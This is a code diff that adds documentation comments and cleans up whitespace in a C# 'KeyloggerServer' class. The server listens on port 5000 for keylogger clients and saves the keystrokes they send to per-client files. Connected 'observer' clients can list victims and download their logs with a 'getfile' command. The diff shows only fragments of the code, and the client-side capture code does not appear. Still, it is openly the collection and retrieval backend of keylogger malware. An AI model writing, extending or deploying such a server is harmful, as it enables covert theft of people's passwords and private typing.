@@ -11,6 +11,9 @@ using Common;
 
 namespace ServerCore
 {
+    /// <summary>
+    /// Represents a server that handles keylogger clients and observer clients.
+    /// </summary>
     public class KeyloggerServer : ISubject
     {
         private readonly List<ClientHandler> _clients = new List<ClientHandler>();
@@ -19,6 +22,10 @@ namespace ServerCore
         private TcpListener _listener;
         private bool _running = true;
 
+        /// <summary>
+        /// Starts the server and listens for incoming connections.
+        /// </summary>
+        /// <returns>A task representing the asynchronous server operation.</returns>
         public async Task RunAsync()
         {
             Console.WriteLine("Starting server on port 5000...");
@@ -30,10 +37,13 @@ namespace ServerCore
             Console.WriteLine("Server is running. Press Ctrl+C to stop...");
             _ = Task.Run(AcceptClientsLoop);
 
-            await Task.Delay(Timeout.Infinite); // menține serverul activ la nesfârșit
+            await Task.Delay(Timeout.Infinite);
         }
 
-
+        /// <summary>
+        /// Continuously accepts incoming clients and handles them based on their role (client or observer).
+        /// </summary>
+        /// <returns>A task representing the asynchronous loop operation.</returns>
         private async Task AcceptClientsLoop()
         {
             while (_running)
@@ -70,6 +80,11 @@ namespace ServerCore
             }
         }
 
+        /// <summary>
+        /// Reads the initial role string sent by a connected client.
+        /// </summary>
+        /// <param name="client">The TcpClient to read from.</param>
+        /// <returns>A string indicating the role (e.g., "client", "observer").</returns>
         private async Task<string> ReadRoleAsync(TcpClient client)
         {
             var buffer = new byte[10];
@@ -78,6 +93,11 @@ namespace ServerCore
             return Encoding.UTF8.GetString(buffer, 0, bytesRead).Trim('\0', '\r', '\n', ' ');
         }
 
+        /// <summary>
+        /// Handles communication with a connected keylogger client, saving received keystrokes and notifying observers.
+        /// </summary>
+        /// <param name="handler">The client handler.</param>
+        /// <returns>A task representing the asynchronous operation.</returns>
         private async Task HandleClientAsync(ClientHandler handler)
         {
             var stream = handler.Stream;
@@ -119,6 +139,11 @@ namespace ServerCore
             }
         }
 
+        /// <summary>
+        /// Keeps an observer client connected and handles special commands like "list" or "getfile".
+        /// </summary>
+        /// <param name="observer">The observer client.</param>
+        /// <returns>A task representing the asynchronous operation.</returns>
         private async Task KeepAliveObserver(IObserver observer)
         {
             try
@@ -157,12 +182,12 @@ namespace ServerCore
                                 string clientId = command.Substring("getfile".Length).Trim();
                                 string safeFileName = clientId.Replace(":", "_");
                                 string filePath = Path.Combine("SaveData", safeFileName + ".txt");
+
                                 try
                                 {
                                     if (File.Exists(filePath))
                                     {
                                         string fileContent;
-
                                         using (var fs = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                                         using (var sr = new StreamReader(fs))
                                         {
@@ -180,12 +205,12 @@ namespace ServerCore
                                 }
                                 catch (Exception ex)
                                 {
-                                    Console.WriteLine($"Error reading or sending file: {ex.Message}");                             
+                                    Console.WriteLine($"Error reading or sending file: {ex.Message}");
                                 }
                             }
                         }
 
-                        await Task.Delay(100); // Small delay to prevent CPU spin
+                        await Task.Delay(100);
                     }
                 }
             }
@@ -201,16 +226,28 @@ namespace ServerCore
             }
         }
 
+        /// <summary>
+        /// Attaches an observer to the notification list.
+        /// </summary>
+        /// <param name="observer">The observer to attach.</param>
         public void Attach(IObserver observer)
         {
             lock (_lock) _observers.Add(observer);
         }
 
+        /// <summary>
+        /// Detaches an observer from the notification list.
+        /// </summary>
+        /// <param name="observer">The observer to detach.</param>
         public void Detach(IObserver observer)
         {
             lock (_lock) _observers.Remove(observer);
         }
 
+        /// <summary>
+        /// Notifies all observers with a new message.
+        /// </summary>
+        /// <param name="message">The message to send to observers.</param>
         public void Notify(string message)
         {
             lock (_lock)
